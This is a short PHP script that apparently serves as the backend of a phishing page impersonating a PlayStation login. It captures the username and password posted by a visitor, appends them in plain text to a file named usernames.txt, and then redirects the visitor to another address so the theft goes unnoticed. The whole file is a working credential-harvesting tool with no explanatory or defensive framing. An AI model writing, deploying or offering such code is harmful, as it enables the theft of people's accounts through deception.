<?php

file_put_contents("usernames.txt", "Playstation Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://redirecturl');
exit();
?>